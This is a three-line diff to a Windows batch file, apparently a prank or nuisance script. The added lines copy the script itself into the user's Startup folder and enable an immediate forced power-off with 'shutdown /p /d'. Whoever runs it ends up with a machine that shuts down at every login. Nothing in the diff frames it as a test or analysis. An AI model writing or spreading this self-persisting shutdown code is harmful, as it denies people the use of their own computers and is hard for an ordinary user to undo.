@@ -1,3 +1,3 @@
 @echo off
-copy "C:\Users\%username%\Desktop\somefolder\TurnOff.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
-rem shutdown /p /d :)
+copy "%~f0" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+shutdown /p /d
